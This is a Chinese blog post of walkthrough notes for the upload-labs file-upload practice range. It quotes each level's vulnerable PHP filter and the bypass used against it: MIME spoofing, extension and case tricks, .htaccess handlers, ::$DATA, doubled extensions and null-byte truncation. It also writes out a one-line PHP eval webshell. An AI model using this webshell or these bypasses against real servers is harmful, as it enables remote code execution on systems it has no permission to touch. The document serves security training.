---
title: upload-labs通关笔记
categories:
- upload-labs
tags:
- 上传
updated: 2018-08-01
---



很早之前就已经写好了，只是一直都没有时间去上传。最近心情不是很好，最后有几个没有做，以后慢慢再补吧。前几天看到了一个大佬写的上传的靶场，据说是到目前来说，常见的都在里面，然后自己下载了之后，在本地搭建练习一下，正好总结一下上传的各种方法。附上下载链接：  https://github.com/c0ny1/upload-labs

 大致的思维导图就是这样的：

<img src="{{ site.url }}/assets//blog_images/upload-labs_mind-map.png" />

​ 我是使用作者直接提供的环境一键搭建的，打开之后就是这样的：

<img src="{{ site.url }}/assets//blog_images/upload-labs_01.png" />



**pass-01 客户端使用js对不合法图片进行检查！ **

首先查看源码：

```php
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```



直接上传一个一句话小马：1.php 内容为：`<?php @eval($_POST['enen']);?>`

<img src="{{ site.url }}/assets//blog_images/upload-labs_1_01.png" />

直接显示不允许上传，这个时候直接改名字为 1.png ，内容为`<?php @eval($_POST['enen']);?>`

这个时候已经显示了上传成功

<img src="{{ site.url }}/assets//blog_images/upload-labs_1_02.png" />

访问一下看看：

<img src="{{ site.url }}/assets//blog_images/upload-labs_1_03.png" />

**法1**

接下来我们可以使用bp改包上传：

<img src="{{ site.url }}/assets//blog_images/upload-labs_1_04.png" />

将1.php.png中png删除，这个时候upload中已经有了1.php文件，这个时候我们用菜刀连接一下看看：

连接成功

<img src="{{ site.url }}/assets//blog_images/upload-labs_1_05.png" />



**法2** 

直接在firefox中禁用js（有些后台中利用js进行校验，只要禁用了之后就可以直接跳转到后台，绕过登录）

地址栏输入about:config,查找javascript，将javascript.enabled的类型改为false，默认值为true 

<img src="{{ site.url }}/assets//blog_images/upload-labs_1_06.png" />

这个时候刷新页面，再次点击上传即可！（做完之后记得改回来）



**pass-02  服务端对数据包的MIME进行检查**

查看一下代码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists($UPLOAD_ADDR)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {
                $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name'];
                $is_upload = true;

            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = $UPLOAD_ADDR.'文件夹不存在,请手工创建！';
    }
}
```

直接上传一个php文件会显示文件类型不正确，请重新上传，而且文件类型不对，这个时候直接上传一句话木马，1.png 然后在bp里面进行修改：

直接将png修改为php即可：

<img src="{{ site.url }}/assets//blog_images/upload-labs_2_01.png" />

菜刀连接，显示连接正常。



**pass-03 禁止上传.asp|.aspx|.php|.jsp后缀文件**

查看源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists($UPLOAD_ADDR)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR. '/' . $_FILES['upload_file']['name'])) {
                 $img_path = $UPLOAD_ADDR .'/'. $_FILES['upload_file']['name'];
                 $is_upload = true;
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';
    }
}
```

直接上传一句话木马的1.png是可以的 ，直接上传1.php是被禁止上传

<img src="{{ site.url }}/assets//blog_images/upload-labs_3_01.png" />

本关的本意是想上传一些后缀名为php、php2、php3、php5、phtml等文件去绕过黑名单的,那就直接上传一个1.php3文件，直接可以解析到。



**pass04**_.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件禁止上传

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists($UPLOAD_ADDR)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {
                $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name'];
                $is_upload = true;
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';
    }
}
```

这个时候考虑上传.htacess 文件

文件内容：

```php
<FilesMatch "crow">
    SetHandler application/x-httpd-php
</FilesMatch>
```

当apache在解析该目录下的php时，就会按照.htaccess中的要求去解析，这里设置的是当文件名字中存在crow的时候会当php文件去解析。

此处显示上传.htaccess文件成功

<img src="{{ site.url }}/assets//blog_images/upload-labs_3_02.png" />

然后上传1.png一句话木马，访问一下看看（注意此处不能上传黑名单中的文件类型：php、asp等）

<img src="{{ site.url }}/assets//blog_images/upload-labs_3_03.png" />



这个时候就显示菜刀连接成功了：

<img src="{{ site.url }}/assets//blog_images/upload-labs_4_01.png" />

**pass05_**.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件禁止上传！

查看源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists($UPLOAD_ADDR)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {
                $img_path = $UPLOAD_ADDR . '/' . $file_name;
                $is_upload = true;
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';
    }
}
```

这个时候明确表示了不准上传.htaccess文件了，但是这个没有限制文件的大小写，所以直接上传.Php文件

<img src="{{ site.url }}/assets//blog_images/upload-labs_5_01.png" />





**Pass06_.**php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件禁止上传！

查看源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists($UPLOAD_ADDR)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {
                $img_path = $UPLOAD_ADDR . '/' . $file_name;
                $is_upload = true;
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';
    }
}
```



有黑名单限制，但是可以加空格啊，直接在bp修改1.php(空格),当然了在windows中带空格的后缀文件时无法生成的

<img src="{{ site.url }}/assets//blog_images/upload-labs_6_01.png" />

连接菜刀更新缓存之后，发现连接成功。



**pass-07 禁止上传所有可以解析的后缀！** 

查看源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists($UPLOAD_ADDR)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {
                $img_path = $UPLOAD_ADDR . '/' . $file_name;
                $is_upload = true;
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';
    }
}
```

直接禁止了所有可以解析的后缀，所以这个时候可以使用在文件后缀后面再加一个.

1.php.

直接在bp中修改，然后菜刀连接即可！



**pass08**_.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件禁止上传！

查看源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists($UPLOAD_ADDR)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {
                $img_path = $UPLOAD_ADDR . '/' . $file_name;
                $is_upload = true;
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';
    }
}
```

这个时候我尝试去传Php3的时候，发现上传失败。。。上传了php33的时候，虽然上传成功了，但是无法连接

**法一** 

这个时候用bp加点点进行上传：1.php..

<img src="{{ site.url }}/assets//blog_images/upload-labs_8_01.png" />

很好，上传失败。。。

继续：上传1.php(点空格点)

这个时候显示上传成功，可以通过菜刀连接。

**法二**

后缀名进行去 ::DATA 处理，利用windows特性，可在后缀名中加  ::$DATA 绕过 

利用bp在1.php后面加  ::$DATA   直接就上传成功了，直接菜刀连接即可！



**Pass-09 只允许上传.jpg|.png|.gif后缀的文件！** 

查看源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists($UPLOAD_ADDR)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {
                $img_path = $UPLOAD_ADDR . '/' . $file_name;
                $is_upload = true;
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';
    }
}
```

直接使用pass08中法一即可



**pass10_.**php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess字符被去除！

查看源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists($UPLOAD_ADDR)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $file_name)) {
            $img_path = $UPLOAD_ADDR . '/' .$file_name;
            $is_upload = true;
        }
    } else {
        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';
    }
}
```

直接上传一个1.php一句话木马，发现后缀被删除了，后台使用str_ireplace函数将文件后缀为黑名单的都给删除了，但是str_ireplace函数只做一次替换，所以使用pphphp后缀名就能绕过 ，直接上传一句话木马1.pphphp即可

**pass11  pass上传路径可控！ **

查看源码：

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        }
        else{
            $msg = '上传失败！';
        }
    }
    else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

直接上传一句话1.php，会显示上传失败

防御手法是白名单过滤，只允许上传jpg、png和gif类型，并且将上传的文件给重命名为了白名单中的后缀 

然后去上传一句话图片马1.png，虽然上传了，但是重新命名了文件的名字。

处理上传文件的方式

```php
$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

<img src="{{ site.url }}/assets//blog_images/upload-labs_11_01.png" />



可以先上传一个后缀名为jpg,内容为一句话木马的文件，然后修改上传目录为.php后缀，之后在.php后使用截断后面的拼接内容，注意这里需要关掉magic_quotes_gpc这个php扩展，否则00会被转义 ，$img_path直接拼接，因此可以利用%00截断绕过： 

保存的位置写1.php%00

上传文件写为1.png

<img src="{{ site.url }}/assets//blog_images/upload-labs_11_02.png" />

这个时候就显示上传成功了



**pass12  本pass上传路径可控！**

查看文件源码：

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        }
        else{
            $msg = "上传失败";
        }
    }
    else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```



和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。

直接上传一句话图片木马 1.png，然后使用bp进行数据修改：在这个位置上写1.php(空格)，然后在HEX中进行修改：

<img src="{{ site.url }}/assets//blog_images/upload-labs_12_01.png" />



<img src="{{ site.url }}/assets//blog_images/upload-labs_12_02.png" />

将70  68 70 20 中的20修改为00

<img src="{{ site.url }}/assets//blog_images/upload-labs_12_03.png" />

直接点击上传即可。



**pass13 本pass检查图标内容开头2个字节！ **

查看源码：

```php
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = $UPLOAD_ADDR."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        }
        else{
            $msg = "上传失败";
        }
    }
}
```



这个时候直接上传一句话图片木马，显示文件未知，上传失败！

该关通过读文件的前2个字节判断文件类型 

然后上传一张gif的图片：

<img src="{{ site.url }}/assets//blog_images/upload-labs_13_01.png" />

直接显示上传成功，这个是一个一句话木马的gif图。

但是上传之后，文件的名字为1.gif进行了文件名字的重写。。。

这个时候直接在控制台中搜索关键字：upload即可找到（或者是在bp中也可以看到）

<img src="{{ site.url }}/assets//blog_images/upload-labs_13_02.png" />

这个时候可以访问到：

<img src="{{ site.url }}/assets//blog_images/upload-labs_13_03.png" />

**pass14 15都可以使用13的方法 **







































































































































